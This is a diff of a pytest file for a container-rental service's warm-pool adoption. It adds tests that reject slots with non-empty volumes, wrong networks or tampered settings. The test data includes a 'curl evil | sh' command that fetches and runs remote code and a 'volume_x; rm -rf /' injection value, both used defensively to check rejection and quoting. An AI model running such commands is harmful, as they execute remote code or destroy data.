@@ -134,6 +134,9 @@ def _slot_doc(spec, image_doc: dict, *, labels: dict | None = None, **over) -> d
             "MaskedPaths": ["/proc/asound", "/proc/acpi", "/proc/kcore", "/proc/keys", "/sys/firmware"],
             "ReadonlyPaths": ["/proc/bus", "/proc/fs", "/proc/irq", "/proc/sys", "/proc/sysrq-trigger"],
         },
+        "NetworkSettings": {
+            "Networks": {spec.network: {}} if spec.network else {},
+        },
     }
     for key, value in over.items():
         doc[key] = value
@@ -614,6 +617,7 @@ def test_image_volume_lines_are_anonymous_mounts_on_slot_and_rental_alike(svc):
         (lambda d: d["Config"].__setitem__("Cmd", ["/bin/sh", "-c", "curl evil | sh"]), "command"),
         (lambda d: d["Config"].__setitem__("Entrypoint", ["/evil"]), "entrypoint"),
         (lambda d: d["Config"].__setitem__("Image", "daturaai/pytorch:other"), "image reference"),
+        (lambda d: d["NetworkSettings"]["Networks"].__setitem__("evil", {}), "network"),
         # `--security-opt systempaths=unconfined` empties both lists: the renter would see the host's
         # /proc/kcore and a writable /proc/sys
         (lambda d: d["HostConfig"].__setitem__("MaskedPaths", []), "masked paths"),
@@ -647,6 +651,8 @@ def test_real_dockerd_inspect_documents_parse_and_match(svc):
         doc["Mounts"][0]["Driver"] = "vloopback:latest"
         # the pod predates the ICC-off rental bridge (DAH-3199); a slot created today sits on it
         doc["HostConfig"]["NetworkMode"] = RENTAL_NETWORK_NAME
+        bridge = ((doc.get("NetworkSettings") or {}).get("Networks") or {}).get("bridge") or {}
+        doc.setdefault("NetworkSettings", {})["Networks"] = {RENTAL_NETWORK_NAME: bridge}
 
     slot = warm_pool.slot_from_inspect(plain, image_id=image["Id"], now=now, max_age=MAX_AGE)
     assert slot is not None
@@ -738,6 +744,8 @@ def _host(
     network_inspect: str = NETWORK_INSPECT,
     layer_diff: str = "",
     layer_diff_exit: int = 0,
+    volume_files: str = "",
+    volume_files_exit: int = 0,
 ):
     """An ssh client whose host answers the warm-pool commands like a node with one slot."""
     ssh = _ssh_client(inspect_exit=0)
@@ -748,6 +756,8 @@ def _host(
             return _ssh_result(
                 stdout=json.dumps(image) + "\n__LIUM_WARM_POOL__\n" + json.dumps([doc]) + "\n"
             )
+        if "docker volume inspect" in cmd and ".Mountpoint" in cmd:
+            return _ssh_result(exit_status=volume_files_exit, stdout=volume_files)
         if "docker volume inspect" in cmd:
             return _ssh_result(exit_status=volume_inspect_exit, stdout=volume_inspect)
         if "docker network inspect" in cmd:
@@ -825,7 +835,8 @@ async def test_flag_on_adopts_the_slot_instead_of_creating(svc, monkeypatch):
     assert cmds.index(warm_pool.inspect_volume_command(f"volume_{SLOT_ID}")) < cmds.index(adopt[0])
     # and the rental network was read as an ICC-off bridge before the start (DAH-3199)
     assert cmds.index(warm_pool.inspect_network_command(spec.network)) < cmds.index(adopt[0])
-    # and the writable layer was read as untouched, last thing before the rename
+    # and the slot volume was listed empty, then the writable layer last thing before the rename
+    assert cmds.index(warm_pool.list_volume_files_command(f"volume_{SLOT_ID}")) < cmds.index(adopt[0])
     assert cmds.index(warm_pool.diff_slot_command(spec.name)) == cmds.index(adopt[0]) - 1
     # the renter's keys still land after the start, as on every rental
     assert any(
@@ -935,6 +946,15 @@ def test_volume_mismatch_reads_the_plugin_record(svc):
     assert warm_pool.volume_mismatch(slot, "local|40g|true|\n") == "volume driver"
     assert warm_pool.volume_mismatch(slot, "a|40g|true|\nb|40g|true|\n") == "volume not inspectable"
     assert "'volume_x; rm -rf /'" in warm_pool.inspect_volume_command("volume_x; rm -rf /")
+
+
+def test_volume_not_empty_reads_the_listing():
+    assert warm_pool.volume_not_empty("") is None
+    assert warm_pool.volume_not_empty("\n  \n") is None
+    assert warm_pool.volume_not_empty(".bashrc\n") == "volume_not_empty"
+    assert warm_pool.volume_not_empty("lost+found\n.id\n") == "volume_not_empty"
+    assert "'volume_x; rm -rf /'" in warm_pool.list_volume_files_command("volume_x; rm -rf /")
+    assert ".Mountpoint" in warm_pool.list_volume_files_command("volume_x")
 
 
 def test_slot_mounting_a_volume_that_is_not_its_own_is_not_a_slot(svc):
@@ -1103,6 +1123,7 @@ def _log_fields(records, key):
 LEAK_SITES = [
     ("lookup", "lookup_failed:OSError", "reason"),
     ("volume-inspect", "volume_inspect_failed:OSError", "detail"),
+    ("volume-list", "volume_list_failed:OSError", "reason"),
     ("network-inspect", "network_inspect_failed:OSError", "reason"),
     ("layer-diff", "layer_diff_failed:OSError", "reason"),
     ("slot-matches", "slot_document_unreadable:RuntimeError", "reason"),
@@ -1127,6 +1148,8 @@ async def test_adopt_path_failures_log_a_token_and_the_exception_type_only(
         if site == "lookup" and "__LIUM_WARM_POOL__" in cmd:
             raise OSError(LEAK_CANARY)
         if site == "volume-inspect" and cmd == warm_pool.inspect_volume_command(f"volume_{SLOT_ID}"):
+            raise OSError(LEAK_CANARY)
+        if site == "volume-list" and cmd == warm_pool.list_volume_files_command(f"volume_{SLOT_ID}"):
             raise OSError(LEAK_CANARY)
         if site == "network-inspect" and cmd == warm_pool.inspect_network_command(spec.network):
             raise OSError(LEAK_CANARY)
@@ -1251,18 +1274,60 @@ async def test_slot_with_a_written_layer_is_removed_not_adopted(
 
 
 @pytest.mark.parametrize(
-    "settings_reason, network_reason, layer_reason, expected, reads",
+    "volume_files, volume_files_exit, reason",
     [
-        ("mounts", None, None, "mounts", []),
-        (None, "network not inspectable", None, "network not inspectable", ["network"]),
-        (None, None, "layer_modified", "layer_modified", ["network", "layer"]),
-        (None, None, None, None, ["network", "layer"]),
+        (".bashrc\n", 0, "volume_not_empty"),
+        ("lost+found\n", 0, "volume_not_empty"),
+        ("\n", 1, "volume list exit 1"),
     ],
-    ids=["settings-first", "network-second", "layer-last", "adoptable"],
+    ids=["dotfile", "lost-found", "list-fails"],
 )
 @pytest.mark.asyncio
-async def test_rejection_reason_reads_settings_then_network_then_layer(
-    svc, monkeypatch, settings_reason, network_reason, layer_reason, expected, reads
+async def test_slot_with_files_in_the_volume_is_removed_not_adopted(
+    svc, monkeypatch, caplog, volume_files, volume_files_exit, reason
+):
+    """The miner can write into the slot volume at /root without touching a setting slot_matches
+    reads. An empty listing is required; anything else — or a listing that cannot be read — is a
+    fallback: the slot and its volume go, the rental takes the docker run path."""
+    monkeypatch.setattr(ds_module.settings, "WARM_POOL_ENABLED", True)
+    payload = _adoptable_payload()
+    spec = _spec(svc, payload)
+    ssh = _host(
+        svc, spec, _image_doc(), volume_files=volume_files, volume_files_exit=volume_files_exit
+    )
+    _patch_happy(svc, monkeypatch, ssh)
+
+    with caplog.at_level(logging.INFO, logger="services.docker_service"):
+        result = await _run(svc, payload)
+
+    assert isinstance(result, ContainerCreated)
+    cmds = _cmds(ssh)
+    assert warm_pool.list_volume_files_command(f"volume_{SLOT_ID}") in cmds
+    assert not any("docker rename" in c or "docker start" in c for c in cmds)
+    assert any(
+        f"docker rm -f {spec.name}" in c and f"volume rm volume_{SLOT_ID}" in c for c in cmds
+    )
+    fallback = [r for r in caplog.records if str(r.msg) == "warm_pool adopt=fallback"]
+    assert [r.msg.extra["reason"] for r in fallback] == [reason]
+    svc.create_local_volume.assert_awaited_once()
+    svc._run_rental_docker_create_with_port_retry.assert_awaited_once()
+    assert result.volume_name == f"volume_{payload.pod_id}"
+
+
+@pytest.mark.parametrize(
+    "settings_reason, network_reason, volume_reason, layer_reason, expected, reads",
+    [
+        ("mounts", None, None, None, "mounts", []),
+        (None, "network not inspectable", None, None, "network not inspectable", ["network"]),
+        (None, None, "volume_not_empty", None, "volume_not_empty", ["network", "volume"]),
+        (None, None, None, "layer_modified", "layer_modified", ["network", "volume", "layer"]),
+        (None, None, None, None, None, ["network", "volume", "layer"]),
+    ],
+    ids=["settings-first", "network-second", "volume-third", "layer-last", "adoptable"],
+)
+@pytest.mark.asyncio
+async def test_rejection_reason_reads_settings_then_network_then_volume_then_layer(
+    svc, monkeypatch, settings_reason, network_reason, volume_reason, layer_reason, expected, reads
 ):
     """`_warm_slot_rejection_reason` is the whole pre-rename verdict: the first check that rejects
     is the reason and nothing after it touches the host; the layer diff is the last read."""
@@ -1280,12 +1345,18 @@ async def test_rejection_reason_reads_settings_then_network_then_layer(
         assert network_name == spec.network
         return network_reason
 
+    async def _volume(ssh_client, got_slot):
+        order.append("volume")
+        assert got_slot is slot
+        return volume_reason
+
     async def _layer(ssh_client, got_slot):
         order.append("layer")
         assert got_slot is slot
         return layer_reason
 
     monkeypatch.setattr(svc, "_warm_slot_network_mismatch", _network)
+    monkeypatch.setattr(svc, "_warm_slot_volume_not_empty", _volume)
     monkeypatch.setattr(svc, "_warm_slot_layer_modified", _layer)
 
     reason = await svc._warm_slot_rejection_reason(Mock(), slot, spec, image)
@@ -1556,7 +1627,7 @@ async def test_prefetch_state_naming_many_images_bounds_the_maintenance_to_the_n
     ssh = AsyncMock()
     ssh.run = AsyncMock(return_value=_ssh_result(stdout=json.dumps(state)))
 
-    images = await svc._warm_pool_images(ssh)
+    images = await svc._prepulled_image_refs(ssh)
 
     assert len(images) == cap
     newest = sorted(
